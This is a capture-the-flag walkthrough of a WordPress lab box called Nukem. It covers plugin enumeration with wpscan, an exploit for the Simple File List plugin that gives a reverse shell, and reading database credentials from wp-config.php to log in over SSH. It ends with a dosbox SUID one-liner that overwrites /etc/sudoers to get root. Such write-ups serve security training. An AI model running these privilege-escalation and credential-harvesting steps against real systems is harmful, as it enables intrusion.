# Foothold
![](assets/nukem/p80.png)
We can see that the website is running wordpress, lets run an enumeration script using wpscan.

```
wpscan --url http://$IP -e
```

```
[i] Plugin(s) Identified:

[+] simple-file-list
 | Location: http://192.168.182.105/wp-content/plugins/simple-file-list/
 | Last Updated: 2023-05-01T14:47:00.000Z
 | [!] The version is out of date, the latest version is 6.1.6
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 4.2.2 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://192.168.182.105/wp-content/plugins/simple-file-list/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://192.168.182.105/wp-content/plugins/simple-file-list/readme.txt

[+] tutor
 | Location: http://192.168.182.105/wp-content/plugins/tutor/
 | Last Updated: 2023-03-30T10:08:00.000Z
 | [!] The version is out of date, the latest version is 2.1.9
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.5.3 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://192.168.182.105/wp-content/plugins/tutor/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://192.168.182.105/wp-content/plugins/tutor/readme.txt
```

After searching for an exploit for each plugin I found that simple-file-list v1.2.2 was vulnerable to pre-auth RCE, see more here: https://www.exploit-db.com/exploits/48979. From this a reverse shell was granted.

![](assets/nukem/shell.png)

# Getting user

Reading  ```/srv/http/wp-config.php```

```
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** MySQL database username */
define( 'DB_USER', 'commander' );

/** MySQL database password */
define( 'DB_PASSWORD', '***********************' );
```

Using the credentials found we were able to SSH into commander using the DB password.
```
ssh commander@$IP
```
![](assets/nukem/user.png)

The OS running also appears to be a version of arch Linux.

From this we were able to grab the local.txt flag at ```/home/commander/local.txt```

```
2c2f2**************2c430a37f11
```

Lets run a quick LSE.sh on the machine.

SUID Binaries:
```
/usr/lib/ssh/ssh-keysign
/usr/lib/Xorg.wrap
/usr/bin/ksu
/usr/bin/dosbox
/usr/bin/mount.cifs
/usr/bin/suexec
/usr/bin/vmware-user-suid-wrapper
/usr/bin/sg
/usr/bin/unix_chkpwd
```

# Privesc:
The way to root on this machine was relatively simple, you overwrite the /etc/sudoers file using a vulnerable SUID bit ```/usr/bin/dosbox```. This SUID's exploit can also be located on GTFOBins.
```
/usr/bin/dosbox -c 'mount c /' -c "echo ALL ALL=(ALL) NOPASSWD: ALL > c:\etc\sudoers" -c exit
sudo /bin/bash
```

![](assets/nukem/root.png)
Overrall not much was learnt from this box for me at least, however it was fun.
